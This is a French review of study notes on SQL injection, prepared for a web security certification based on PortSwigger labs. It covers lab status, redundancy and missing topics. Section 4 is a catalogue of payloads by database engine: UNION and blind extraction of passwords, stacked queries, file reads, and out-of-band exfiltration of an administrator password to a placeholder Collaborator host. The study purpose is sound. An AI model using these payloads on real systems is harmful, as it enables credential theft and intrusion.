# Revue documentaire - dossier 01-Server-side/SQL Injection

Date : 2026-11-06. Auteur : web-analyst. Nature : revue de lecture seule. Aucune requête n'a été envoyée, aucun lab rejoué, aucune note ni la cheat sheet modifiée.

Périmètre : SQL-injection.md, Blind-SQL-injection.md, SQL-injection-Union-Attacks.md (dossier `BSCP-Vault/01-Server-side/SQL Injection/`). La note Error-based SQL Injection.md n'est pas revue ; elle sert de référence (seuls ses intitulés de sections et sa section des labs ont été lus pour vérifier la cohérence des cases cochées et proposer des renvois).

Légende des statuts de preuve utilisés dans ce document :
- rejoué (journal) : le payload figure dans un journal de lab rédigé par l'utilisateur.
- rejoué (case cochée, sans journal personnel) : le lab correspondant est coché fait, mais la note ne contient que le texte de solution officiel traduit, ou rien.
- à vérifier : jamais rejoué par l'utilisateur d'après les notes. Une hypothèse, pas une preuve.

## 0. Constats transverses

### 0.1 Écarts de statut et de cases cochées
- Union-Attacks : le frontmatter indique `statut: à faire` alors que la note fait 331 lignes, contient toutes les sections de méthode et sept journaux de labs, avec deux cases cochées (lignes 220 et 221). Statut cohérent : `en cours` (et non `terminé`, car les deux labs Oracle n'ont pas d'entrée, voir 0.2). À noter : sur l'ensemble du vault, 52 notes sont à `à faire` et 12 à `en cours`, donc l'écart est probablement un oubli de mise à jour au moment de la rédaction.
- Union-Attacks, ligne 220 : la case `Apprentice ✅ 2026-10-26` n'a pas de lab correspondant dans cette note (les labs journalisés sont tous de niveau Practitioner, niveau à confirmer sur le site). La date est identique à celle de SQL-injection.md (ligne 90) : probable copier-coller. À corriger ou expliquer.
- Union-Attacks, ligne 221 : `Practitioner ✅ 2026-10-27` est coché globalement, mais deux labs du thème n'ont aucune entrée (version de la base sur Oracle, contenu de la base sur Oracle). Remplacer les cases par niveau par une case par lab, comme dans Blind-SQL-injection.md.
- Blind-SQL-injection : sept labs cochés le 2026-11-02 (lignes 159 à 165) mais un seul journal (réponses conditionnelles). Plus grave, contradiction avec la note de référence : Blind coche `Visible error-based SQL injection` (ligne 161) alors que Error-based SQL Injection.md (lignes 172 et 189) l'indique `non réalisé`. La note la plus récente fait foi par défaut : décocher dans Blind, après confirmation par l'utilisateur.
- Cheat sheet, ligne 157 : "Seul `TO_CHAR(1/0)` sur Oracle a été rejoué". Cela signifie que les labs de délai et hors bande cochés dans Blind n'ont pas de payload rejoué et consigné. Soit les cases sont prématurées, soit les journaux manquent. À trancher par l'utilisateur ; en attendant, ce document traite ces payloads comme "à vérifier".
- Blind, ligne 170 : le moteur du lab des réponses conditionnelles est "probable, non vérifié". Un journal terminé devrait fixer le moteur (une réponse à `version()` suffit, ou noter l'indice qui l'a révélé).

### 0.2 Écart de format des en-têtes (tags)
- SQL-injection.md ligne 2 : `tags: [bscp, server-side, sql-injection]` (liste sur une ligne).
- Blind-SQL-injection.md et SQL-injection-Union-Attacks.md lignes 2 à 5 : même contenu mais en liste YAML sur plusieurs lignes. Error-based a aussi le format multi-lignes.
- Le contenu des tags est identique, seule la forme diffère. Sur le vault, 63 notes utilisent la forme sur une ligne et 4 la forme multi-lignes. Recommandation : aligner les trois notes (et Error-based, sans y toucher ici : à signaler à l'opérateur) sur la forme sur une ligne, majoritaire, pour que les requêtes et le modèle de note restent homogènes.
- Autre différence d'en-tête : le champ `niveau` vaut `apprentice` dans SQL-injection.md et `practitioner` dans les autres. Acceptable, mais la note SQL-injection contient aussi la méthode générale ; documenter la règle (niveau du lab le plus élevé traité).

### 0.3 État des labs : réalisés et non réalisés
Règle : pour les labs non réalisés, ne rien ajouter, laisser les notes en l'état.

| Note | Lab | Statut d'après la note | Contenu actuel |
|---|---|---|---|
| SQL-injection | Données cachées dans la clause WHERE | Réalisé (case Apprentice cochée 2026-10-26) | Énoncé et solution officiels traduits, pas de commentaire personnel |
| SQL-injection | Contournement de connexion | Réalisé (même case) | Idem |
| SQL-injection | niveaux Practitioner et Expert | Non cochés | Aucune entrée : laisser tel quel |
| Blind | Réponses conditionnelles | Réalisé, journal rédigé par l'utilisateur (démarche, longueur de 20 caractères, réglages d'Intruder) | Complet |
| Blind | Erreurs conditionnelles | Réalisé (case cochée) ; journal présent dans Error-based, pas dans Blind | Renvoi à ajouter, rien à dupliquer |
| Blind | Erreur verbeuse (visible error-based) | Contradictoire : coché dans Blind, `non réalisé` dans Error-based | À confirmer par l'utilisateur ; ne rien rédiger |
| Blind | Délais ; délais avec récupération ; hors bande ; hors bande avec exfiltration | Cochés, sans journal | Ne pas rédiger de solution ; l'utilisateur ajoutera ses journaux s'il le souhaite |
| Union | Nombre de colonnes ; colonne de texte ; données d'autres tables ; plusieurs valeurs dans une colonne ; version MySQL et Microsoft ; contenu hors Oracle | Réalisés d'après la case Practitioner du 2026-10-27 | Texte officiel traduit, pas de journal personnel |
| Union | Version sur Oracle ; contenu de la base sur Oracle | Aucune entrée, statut inconnu | Laisser tel quel, ne rien proposer |
| Tous | Niveaux Expert | Non cochés | Laisser tel quel |

Conséquence pour les plans de réécriture : ils ne portent que sur la structure et la méthode générale, jamais sur la résolution d'un lab non réalisé. Le catalogue de payloads de la section 3 est générique (par moteur et par technique) et ne constitue pas un déroulé de lab.

## 1. Note SQL-injection.md

### 1.1 Manques et flou
- Concepts : la note ne définit pas le contexte d'injection (chaîne entre guillemets, nombre, identifiant, clause `ORDER BY`, `LIMIT`, `INSERT` ou `UPDATE`). Tout l'exemple suppose une chaîne dans un `WHERE`. Ajouter un tableau "contexte, comment fermer, exemple".
- Méthodologie de détection (lignes 60 à 68) : reprise de la liste PortSwigger sans procédure décidable. Manquent : test `'` puis `''` ; test arithmétique sur un nombre (`id=2-1` donne la même page que `id=1`) ; test de concaténation neutre par moteur ; comparaison de longueur de réponse ; ordre conseillé (erreur, booléen, délai, hors bande) avec renvoi vers Blind ; critère de confirmation (différence reproductible dépendant de la condition).
- Cas par moteur : aucun tableau dans cette note (les moteurs sont couverts ailleurs). Ajouter un tableau court d'identification du moteur (version, concaténation, commentaire, délai) avec renvoi vers Blind pour le détail, ou un lien unique vers un seul tableau maître.
- Limites : absentes. À écrire : privilèges du compte, requêtes empilées non supportées par certaines interfaces, longueur ou filtrage des entrées, pare-feu applicatif.
- Contre-mesures (lignes 84 à 87) : trois lignes. Manquent : les requêtes paramétrées ne protègent pas les identifiants ni les `ORDER BY` dynamiques (liste blanche), les procédures stockées avec concaténation interne restent vulnérables, la validation d'entrée est un complément et non un remède, la gestion des erreurs, les comptes séparés lecture et écriture.
- Pièges BSCP (lignes 78 à 82) : trois pièges génériques. Manquent : un cookie n'est pas décodé comme une URL (le `+` reste à tester), encoder `;` en `%3B` dans un cookie, `Content-Type` et encodage du corps (JSON, XML), remplacement de la valeur d'origine du cookie, ne pas casser le cookie `session`.
- Injection dans le corps, les cookies et les en-têtes : une seule phrase (lignes 68 et 81, répétée). Développer : formulaires `application/x-www-form-urlencoded`, JSON (échapper les guillemets), XML (encodage en entités pour contourner un filtre), cookies (`TrackingId`), en-têtes (`X-Forwarded-For`, `Referer`, `User-Agent`, `Host` selon la journalisation). Indiquer pour chacun où placer le point d'injection dans Burp.
- Requêtes empilées : absentes. Décrire le principe (`;` pour enchaîner), la dépendance à l'interface de programmation et au moteur, l'usage (délai conditionnel sur SQL Server, écriture), le danger (modification de données).
- Lecture de fichiers : absente. Poser le principe et les prérequis de privilèges (voir catalogue, section 3.7), avec la mention "hors périmètre labs standards, à vérifier sur la cible".
- Second ordre : annoncé "à venir" (ligne 58), à conserver comme tel ; quand l'utilisateur l'aura étudié, décrire : données stockées sans danger, puis réutilisées dans une autre requête.
- Contextes non SQL : manque une distinction avec l'injection NoSQL et avec l'injection dans des langages de requête voisins (LDAP, XPath, ORM). Une ligne de renvoi suffit.
- Impact : la note évoque DoS et compromission du serveur sans les relier à un mécanisme. Relier à : lecture de fichiers, exécution de commandes via fonctions du moteur, contournement d'authentification, élévation de privilèges applicatifs.

### 1.2 Superflu, redondant, hors sujet
- Mise en garde `OR 1=1` répétée deux fois (lignes 39 à 41 puis 82), et encore dans la cheat sheet. Garder une seule occurrence.
- Ligne 79 et 80 (commentaire MySQL, encodage) répétées dans Union (lignes 80 à 85, 207, 208) et dans Blind (lignes 127, 135). Garder la version de cette note comme source unique.
- Lignes 85 à 87 (prévention) recopiées presque mot pour mot dans Union (lignes 215 à 217). Dans Union, remplacer par un renvoi.
- Liens hors sujet : `[[Access-control]]` et `[[Authentication]]` (lignes 112 et 113) ne sont pas justifiés dans le corps. `[[Authentication]]` peut rester si une phrase relie le contournement de connexion à cette note ; sinon retirer.
- Lien manquant : aucune référence à [[Error-based SQL Injection]] (ligne 57 mentionne l'aveugle seulement). Ajouter dans "Types et variantes" et "Liens".
- Section "Types et variantes" (lignes 52 à 58) : "Vus jusqu'ici" est une remarque de progression de rédaction, pas du contenu pérenne. Remplacer par un tableau des variantes (en bande, erreur, aveugle, hors bande, second ordre) avec lien.
- Lignes 14 à 24 et 26 à 37 : bon pédagogiquement, mais les puces "Lecture de la requête" sont très détaillées par rapport au reste ; acceptable, à condenser en un bloc de code annoté.
- Journaux (lignes 94 à 108) : texte officiel traduit sans apport personnel. Garder, mais indiquer la source et ajouter 2 lignes "ce que j'ai observé" (réponse HTTP, piège) à la place de la recopie de l'énoncé.
- Style : doubles lignes vides avant "Liens" (lignes 109 et 110). Mineur.

### 1.3 Pièges propres à cette note
- Ligne 28 : l'URL montre `Gifts'--` sans encodage ; dans un navigateur, l'espace et `'` seront encodés différemment selon le contexte. À signaler.
- Ligne 34 : `+OR+1=1--` fonctionne sur la plupart des moteurs mais sur MySQL le commentaire exige l'espace final (déjà signalé en ligne 79, relier).

## 2. Note Blind-SQL-injection.md

### 2.1 Manques et flou
- Concepts : l'oracle booléen (une question vrai ou faux par requête) est expliqué dans les exemples mais pas défini. Définir "oracle", "signal", "bruit" en tête de note.
- Méthodologie de détection (lignes 76 à 89) : bonne. Manquent : mesurer le bruit de base du temps de réponse (écart-type sur 5 à 10 requêtes) avant de conclure sur un délai ; utiliser un délai court (3 à 5 secondes) pour la détection puis plus long pour l'extraction ; confirmer par l'inversion (vrai puis faux puis vrai).
- Cas par moteur : le tableau (lignes 120 à 132) est utile. Manquent : SQLite (`substr`, `sqlite_version()`, pas de fonction de délai native), `CHAR_LENGTH` pour MySQL, `FETCH FIRST` selon la version d'Oracle (12c et suivantes, à vérifier), différence de sensibilité à la casse selon la collation (ligne 108 dit "par défaut" : préciser que cela dépend de la collation).
- Limites : manque la volumétrie (nombre de requêtes pour un mot de passe de 20 caractères), le débit limité par un pare-feu ou une limitation de cadence, la dérive des délais sous charge.
- Contre-mesures : section riche (lignes 148 à 155). Seule remarque : le renvoi vers SQL-injection est correct ; les points sur la surveillance et les flux sortants sont à conserver.
- Pièges BSCP : manquent le piège "pas de délai si la ligne n'est pas retenue" pour PostgreSQL (la sous-requête sleep n'est évaluée que si la ligne est lue ; hypothèse à vérifier) ; la déduction que `Welcome back` change avec la session ; le risque de verrouillage de compte si l'on injecte dans une fonction de connexion ; la prise en compte de la mise en cache (variations d'en-tête).
- Injection dans le corps, cookies et en-têtes : traité en partie (ligne 139). Ajouter le cas JSON et XML, et l'ordre de test cookie par cookie.
- Requêtes empilées : une ligne de tableau et une mention. Ajouter une courte section "quand l'empilage fonctionne" (SQL Server, PostgreSQL) et le danger de modification.
- Lecture de fichiers et hors bande liée (MySQL `LOAD_FILE`, ligne 71) : manque le prérequis `FILE` et la variable `secure_file_priv` (hypothèse à vérifier).
- Second ordre et aveugle : mentionner que les signaux peuvent apparaître dans une autre page ou plus tard.
- Contextes non SQL : une phrase de renvoi suffit.
- Hors bande : la ligne 68 (Oracle) mélange la variante sans correctif (XXE via `xmltype`) et le correctif ; séparer en deux lignes avec le critère de version (à vérifier).

### 2.2 Superflu, redondant, hors sujet
- Redondance forte avec Error-based SQL Injection.md. Sections concernées dans Blind : "Réponses conditionnelles avec erreurs" (lignes 34 à 42), "Erreurs verbeuses" (lignes 44 à 49), lignes de tableau 21 et 22, fiche "Visible error-based" du lot de labs (ligne 161), et l'extraction conditionnelle par `SUBSTR` (ligne 42). Divergence déjà observable : Blind utilise `0x5c` pour `EXTRACTVALUE` (ligne 47) alors que la cheat sheet utilise `0x7e` ; une seule source évite ce genre d'écart.
  Proposition de réduction :
  1. Dans le tableau "Types et variantes", garder les deux lignes mais ajouter en dernière colonne un renvoi vers [[Error-based SQL Injection]].
  2. Remplacer les deux sections par un paragraphe de quatre lignes chacune : définition en une phrase, signal attendu, quand choisir cette variante, puis "payloads par moteur, limites et lab : voir [[Error-based SQL Injection]]".
  3. Conserver dans Blind seulement ce qui est propre à l'aveugle : le choix entre variantes (arbre de décision) et l'extraction par comparaison de caractères commune à toutes les variantes.
  4. Ligne 42 (extraction avec `SUBSTR`) : garder une seule fois dans Blind, section "Extraire un mot de passe", et enlever la mention dans l'ancienne section d'erreurs.
  5. Lignes 161 et 160 du lot de labs : ne lister que les labs sans doublon et pointer les deux labs d'erreur vers Error-based.
  6. Ajouter [[Error-based SQL Injection]] dans "Liens" (absent aujourd'hui).
  7. Pour la compatibilité Obsidian, lier la note entière plutôt qu'un intitulé contenant des backticks.
  Gain estimé : environ 15 lignes de Blind supprimées, un risque d'incohérence en moins.
- Remarques de rédaction laissées dans le texte :
  - Ligne 158 : "d'après l'agent (liste et moteurs non revérifiés en ligne)" : remarque de production, à retirer ou à remplacer par une vérification faite par l'utilisateur sur le site.
  - Ligne 134 : "Dans le tableau Markdown, le `\|` est échappé ; l'écrire normalement" : note technique de rédaction, à garder en commentaire HTML ou à supprimer.
  - Lignes 182 à 194 : le "Modèle pour les autres labs" est un gabarit. Il est utile, mais devrait vivre dans un fichier de modèle du vault ; ici il alourdit la note. Ne pas le remplir à la place de l'utilisateur.
  - Ligne 170 : "PostgreSQL probable, non vérifié" : à résoudre.
  - Ligne 141 : hypothèse non vérifiée sur le `+` dans un cookie, à tester ou à marquer explicitement.
  - Mentions "(Oracle probable)" ou "(PostgreSQL probable)" aux lignes 159 à 165 : hypothèses, à confirmer avant d'être figées.
- Faute mineure : ligne 106, la phrase se termine sans point après `ASCII(...) = 115`.
- Doublons avec les deux autres notes : pièges MySQL et encodage (renvoi correct ligne 138), prévention (renvoi correct ligne 149). Bien. Rester ainsi.
- Liens : aucun lien hors sujet ; l'URL de la cheat sheet PortSwigger est pertinente.

## 3. Note SQL-injection-Union-Attacks.md

### 3.1 Manques et flou
- Concepts : manquent la notion de requête d'origine à une ou plusieurs lignes, l'ordre d'évaluation (`UNION` après `WHERE`), la règle "les types doivent être compatibles colonne par colonne" avec un exemple de conversion implicite (Oracle strict, MySQL permissif, à vérifier).
- Méthodologie : la détection (lignes 23 à 26) est minimale ; renvoyer à SQL-injection et ne garder ici que la décision "résultats affichés ou non". Manque l'arbre : nombre de colonnes, colonnes de texte, extraction ; et le repli quand `UNION` est filtré (passer à l'aveugle ou aux erreurs).
- Cas par moteur : Oracle, MySQL, Microsoft et PostgreSQL sont couverts. Manquent SQLite (`sqlite_master`, `sqlite_version()`), les schémas multiples (`table_schema`, filtrer `information_schema` sur PostgreSQL pour éviter le bruit), les vues utilisateur d'Oracle (`user_tables`, `user_tab_columns`), la forme de requête avec `UNION ALL`.
- Contexte numérique : mentionné ligne 20 mais aucun exemple (`1 UNION SELECT NULL,NULL--` sans guillemet). Ajouter.
- Plusieurs lignes dans une cellule : manquent `GROUP_CONCAT`, `STRING_AGG`, `LISTAGG` pour récupérer toutes les lignes en une seule valeur quand la page n'affiche qu'une ligne.
- Une seule ligne affichée : manquent `LIMIT 1 OFFSET n`, `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY`, `ROWNUM`, `TOP 1` pour parcourir les lignes.
- Limites : longueur de la valeur affichée, caractères échappés, colonne non affichée, filtrage du mot `UNION`, pare-feu. Absent.
- Contre-mesures : recopie de SQL-injection (lignes 215 à 217) avec une ligne en plus (vues de schéma). Remplacer par un renvoi et ne garder que la ligne spécifique (droits sur `information_schema`).
- Pièges BSCP : correct et complet pour l'essentiel. Manquent : un `ORDER BY` qui échoue sans erreur visible ; la colonne de texte qui n'est pas affichée ; troncature par un `LIMIT` de la requête d'origine (la ligne injectée disparaît).
- Injection dans le corps, cookies, en-têtes : une phrase (ligne 212). Pour l'attaque UNION, le point important est que la réponse doive afficher les données ; relier aux pages où un cookie ou un en-tête est réaffiché.
- Requêtes empilées : absentes ; renvoyer à SQL-injection.
- Lecture de fichiers : une ligne de renvoi suffit (prérequis hors labs standards).
- Second ordre : hors périmètre de la note ; un renvoi suffit.
- Contextes non SQL : hors périmètre.
- Ligne 70 : exemple `NullPointerException` : illustration locale, pas de règle ; marquer "exemple".

### 3.2 Superflu, redondant, hors sujet
- Lignes 225 à 324 : les sept journaux sont la traduction du texte officiel (énoncé et "Solution" identiques à la page PortSwigger) et non des journaux personnels. Pour les labs faits, remplacer l'énoncé complet par un résumé de deux lignes et ajouter les observations personnelles (moteur, nombre de colonnes réel, piège rencontré), avec le gabarit de Blind. Ne rien rédiger pour les labs non faits.
- Remarques de rédaction laissées : ligne 37 ("Voici la première."), ligne 118 (renvoi interne qui reprend un intitulé de section), ligne 138 ("consulter le cheat sheet" : lien déjà en bas de page), ligne 194 ("Cela répond au prérequis vu plus haut") : phrases de liaison issues de la traduction, à nettoyer.
- Redondances internes : Oracle `FROM DUAL` répété (lignes 75 à 77 et 206), MySQL commentaire répété (lignes 80 à 85 et 207), `%2b` répété (lignes 149 et 208), concaténation répétée avec la cheat sheet.
- Redondance avec SQL-injection : lignes 23 à 26 (détection) et 84 à 85 (astuce encodage) déjà dans SQL-injection ; lignes 215 à 217 (prévention) recopiées.
- Liens hors sujet : `[[Access-control]]` et `[[Authentication]]` (lignes 328 et 329) ; seul le dernier lab (connexion avec les identifiants récupérés) touche à l'authentification. Retirer ou justifier. Manquent : `[[SQL-injection]]`, `[[Blind-SQL-injection]]`, `[[Error-based SQL Injection]]`, `[[Payloads-cheatsheet]]`.
- Style : le mélange de tableaux Markdown alignés et non alignés (lignes 142 à 147 et 162 à 166) ; harmoniser. La concaténation est déjà dans Blind (ligne 128) : garder un seul tableau maître et renvoyer.

## 4. Catalogue de payloads complémentaire

Hypothèses de lecture : `COLLAB` = domaine fourni par Burp Collaborator, `cond` = condition à tester, `xyz` = valeur d'origine du paramètre. Les payloads de la note Error-based ne sont pas répétés. Tout est "à vérifier" sauf mention contraire, car aucun n'a été rejoué par l'utilisateur d'après les journaux.

### 4.1 UNION par moteur
| Technique | Moteur | Payload | Contexte | Signal attendu | Limites | Statut |
|---|---|---|---|---|---|---|
| Nombre de colonnes, numérique | Tous | `1 ORDER BY 3--` puis `1 UNION SELECT NULL,NULL,NULL--` | Paramètre numérique sans guillemet | Erreur au-delà du nombre réel ; ligne de `NULL` au bon nombre | Un `ORDER BY` hors plage peut être masqué par la page | à vérifier |
| Nombre de colonnes, Oracle | Oracle | `' UNION SELECT NULL,NULL FROM dual--` | Chaîne dans WHERE | Pas d'erreur au bon nombre | `FROM dual` obligatoire | rejoué (case cochée, sans journal personnel) pour le principe ; la variante Oracle à vérifier |
| `UNION ALL` | Tous | `' UNION ALL SELECT NULL,NULL--` | Quand des doublons sont filtrés | Ligne injectée conservée même si identique | Rien de particulier | à vérifier |
| Lignes multiples en une cellule | MySQL | `' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password) FROM users-- ` | Une seule colonne de texte | Toutes les lignes dans une valeur | Limite `group_concat_max_len` | à vérifier |
| Lignes multiples en une cellule | PostgreSQL | `' UNION SELECT NULL,STRING_AGG(username||':'||password,',') FROM users--` | Idem | Idem | Longueur d'affichage | à vérifier |
| Lignes multiples en une cellule | SQL Server | `' UNION SELECT NULL,STRING_AGG(username+':'+password,',') FROM users--` | SQL Server 2017 et suivants | Idem | `FOR XML PATH('')` sur versions plus anciennes ; `+` à encoder en `%2b` | à vérifier |
| Lignes multiples en une cellule | Oracle | `' UNION SELECT NULL,LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username) FROM users--` | Idem | Idem | Longueur maximale d'une chaîne SQL (4000 octets par défaut) | à vérifier |
| Parcours ligne par ligne | PostgreSQL, MySQL | `' UNION SELECT username,password FROM users LIMIT 1 OFFSET 1-- ` | La page n'affiche qu'une ligne | Ligne différente à chaque décalage | Dépend d'une page qui affiche la première ligne injectée | à vérifier |
| Parcours ligne par ligne | SQL Server | `' UNION SELECT username,password FROM users ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--` | Idem | Idem | Ordre requis | à vérifier |
| Parcours ligne par ligne | Oracle | `' UNION SELECT username,password FROM users OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--` | Oracle 12c et suivants | Idem | Version | à vérifier |
| Utilisateur et base courants | MySQL | `' UNION SELECT user(),database()-- ` | Deux colonnes de texte | Valeurs affichées | | à vérifier |
| Utilisateur et base courants | PostgreSQL | `' UNION SELECT current_user,current_database()--` | Idem | Idem | | à vérifier |
| Utilisateur et base courants | SQL Server | `' UNION SELECT SYSTEM_USER,DB_NAME()--` | Idem | Idem | | à vérifier |
| Utilisateur courant | Oracle | `' UNION SELECT user,NULL FROM dual--` | Idem | Idem | | à vérifier |
| Schéma utile | PostgreSQL | `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--` | Éviter le bruit des tables système | Seulement les tables applicatives | Tables dans un autre schéma non vues | à vérifier |
| Version et tables | SQLite | `' UNION SELECT sqlite_version(),NULL--` puis `' UNION SELECT name,sql FROM sqlite_master--` | Applications locales, CTF | Version, puis noms de tables et définitions | Pas de `information_schema` | à vérifier |
| Tables du compte | Oracle | `' UNION SELECT table_name,NULL FROM user_tables--` | Tables du schéma courant | Liste réduite | Ne montre pas les autres schémas | à vérifier |

### 4.2 Aveugle booléen
| Technique | Moteur | Payload | Contexte | Signal attendu | Limites | Statut |
|---|---|---|---|---|---|---|
| Vrai et faux | Tous | `xyz' AND '1'='1` et `xyz' AND '1'='2` | Chaîne, cookie | Message présent puis absent | Une session expirée donne le même résultat que faux | rejoué (journal) |
| Existence d'une table ou d'un utilisateur | PostgreSQL, MySQL | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` | Idem | Message présent si l'utilisateur existe | Une sous-requête à plusieurs lignes produit une erreur | rejoué (journal) |
| Longueur | PostgreSQL, MySQL | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a` | Idem | Bascule du message à la valeur exacte | `LEN` sur SQL Server | rejoué (journal) |
| Caractère par égalité | PostgreSQL | `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` | Idem | Message présent si juste | Casse selon la collation | rejoué (journal) |
| Dichotomie sur le code | PostgreSQL, MySQL, SQL Server | `xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--` | Idem | Environ 7 requêtes par caractère | Nécessite un script ou le Repeater ; Oracle : `SUBSTR` | à vérifier (la version en Intruder est rejouée, pas la dichotomie) |
| Caractère, Oracle | Oracle | `xyz' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a' AND '1'='1` | Idem | Message présent si juste | `FROM dual` si pas de table | à vérifier |
| Caractère, SQL Server | SQL Server | `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--` | Idem | Idem | `LEN` pour la longueur | à vérifier |
| Numérique | Tous | `1 AND 1=1` et `1 AND 1=2` | Paramètre numérique | Page identique à l'original puis page vide | Aucune | à vérifier |
| Sensible à la casse | MySQL | `... AND BINARY SUBSTRING(password,1,1)='A'` | Collation insensible | Distingue `A` de `a` | Spécifique MySQL | à vérifier |
| Existence de colonne | PostgreSQL | `xyz' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')=1--` | Idem | Message présent si la colonne existe | Droits sur `information_schema` | à vérifier |

### 4.3 Aveugle temporel
| Technique | Moteur | Payload | Contexte | Signal attendu | Limites | Statut |
|---|---|---|---|---|---|---|
| Délai simple | MySQL | `xyz' AND SLEEP(5)-- ` | Chaîne | Environ 5 secondes | Aucun délai si aucune ligne n'est retenue | à vérifier |
| Délai conditionnel en sous-requête | PostgreSQL | `xyz' AND (SELECT CASE WHEN (cond) THEN pg_sleep(5) ELSE pg_sleep(0) END)<>''--` | Sans requête empilée | Délai si vrai | Le type renvoyé de `pg_sleep` est `void`, d'où le piège de comparaison ; à vérifier | à vérifier |
| Délai conditionnel, ASCII | PostgreSQL | `'; SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109) THEN pg_sleep(5) ELSE pg_sleep(0) END--` | Cookie : `;` en `%3B` | Délai si vrai | Requêtes empilées exigées | à vérifier |
| Délai sans fonction de pause | MySQL | `xyz' AND IF(cond,BENCHMARK(5000000,SHA1('a')),0)-- ` | Quand `SLEEP` est filtré | Durée variable selon le processeur | Imprécis, charge le serveur | à vérifier |
| Délai sans fonction de pause | Oracle | `xyz' AND (SELECT CASE WHEN (cond) THEN (SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c) ELSE 0 END FROM dual)>=0--` | `dbms_pipe` bloqué | Durée variable | Charge le serveur, imprécis, à éviter sur environnement partagé | à vérifier |
| Délai SQL Server conditionnel | SQL Server | `'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '0:0:5'--` | Requête empilée | 5 secondes si vrai | Interface qui interdit l'empilage | à vérifier |
| SQLite | SQLite | `xyz' AND (SELECT CASE WHEN (cond) THEN randomblob(500000000) ELSE 1 END)` | Pas de pause native | Ralentissement | Imprécis et lourd, à proscrire en dehors d'un laboratoire isolé | à vérifier |

Règles de mesure : régler Intruder sur une requête simultanée, comparer à un délai de référence mesuré avant l'attaque, répéter pour exclure le bruit.

### 4.4 Hors bande
| Technique | Moteur | Payload | Contexte | Signal attendu | Limites | Statut |
|---|---|---|---|---|---|---|
| Interaction DNS | Oracle ancien | `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual--` | Chaîne, `UNION` possible | Requête DNS et HTTP reçues par Collaborator | Corrigé sur versions récentes ; version exacte à vérifier | à vérifier |
| Exfiltration | Oracle | `x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/"> %remote;]>'),'/l') FROM dual)||'` | Cookie | Mot de passe dans le sous-domaine reçu | Caractères valides pour un nom DNS ; longueur de l'étiquette limitée à 63 | à vérifier |
| Interaction DNS | SQL Server | `'; exec master..xp_dirtree '//COLLAB/a'--` | Requête empilée | Requête DNS reçue | Droits ; pare-feu sortant | à vérifier |
| Exfiltration | SQL Server | `'; DECLARE @p VARCHAR(99); SET @p=(SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree "//'+@p+'.COLLAB/a"')--` | Empilé | Valeur dans le sous-domaine | Idem | à vérifier |
| Interaction | PostgreSQL | `'; copy (SELECT '') to program 'nslookup COLLAB'--` | Empilé, droits élevés | Requête DNS reçue | Rôle superutilisateur | à vérifier |
| Interaction | MySQL | `' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='administrator'),'.COLLAB\\a'))-- ` | Serveur Windows | Requête DNS ou SMB | `FILE` et `secure_file_priv` ; inopérant sous Linux | à vérifier |

Rappel : encoder les caractères spéciaux dans un cookie ou une URL (`%`, `?`, `:`, `;`, `=`, espace).

### 4.5 Requêtes empilées (principe)
- SQL Server et PostgreSQL : `'; <requête>--` ; selon l'interface de programmation, une seule instruction est acceptée. Signal : effet visible (délai, interaction hors bande, ligne ajoutée).
- Danger : modification de données. Réserver à des fonctions inoffensives (délai, résolution DNS).
- Statut : à vérifier.

### 4.6 Second ordre (principe, à étudier)
- Étape 1 : enregistrer une valeur contenant `'` dans un champ stocké (nom, adresse, nom d'utilisateur).
- Étape 2 : déclencher une fonction qui réutilise cette valeur (changement de mot de passe, rapport, page de profil).
- Signal : erreur ou comportement anormal dans la seconde fonction, pas dans la première.
- Limites : peu de données retour, séparation dans le temps.
- Statut : à vérifier (note annonce encore "à venir").

### 4.7 Lecture de fichiers et écriture (principe)
| Moteur | Lecture | Écriture | Prérequis | Statut |
|---|---|---|---|---|
| MySQL | `LOAD_FILE('/etc/passwd')` | `SELECT ... INTO OUTFILE '/chemin'` | Privilège `FILE`, `secure_file_priv` | à vérifier |
| PostgreSQL | `pg_read_file('/etc/passwd')` | `COPY ... TO '/chemin'` | Superutilisateur ou rôle dédié | à vérifier |
| SQL Server | `OPENROWSET(BULK '...', SINGLE_CLOB)` | Via composants activés | Droits d'administration | à vérifier |
| Oracle | `UTL_FILE`, répertoire déclaré | `UTL_FILE.PUT_LINE` | Objet `DIRECTORY` et droits | à vérifier |
Ces fonctions sortent du cadre des labs standards et doivent rester dans un environnement autorisé et isolé.

### 4.8 Contournements de filtre courants (principe)
- Casse (`UnIoN`), commentaires en ligne (`UN/**/ION`), espaces remplacés (`/**/`, `%0a`, `%09`), double encodage URL, entités XML dans un corps XML, valeurs hexadécimales pour éviter les guillemets.
- Statut : à vérifier. Un lab de contournement de filtre par encodage XML existe dans la catégorie ; il n'est listé dans aucune note, donc considéré non réalisé, rien à proposer.

## 5. À reporter dans la cheat sheet (uniquement ce qui n'y figure pas)

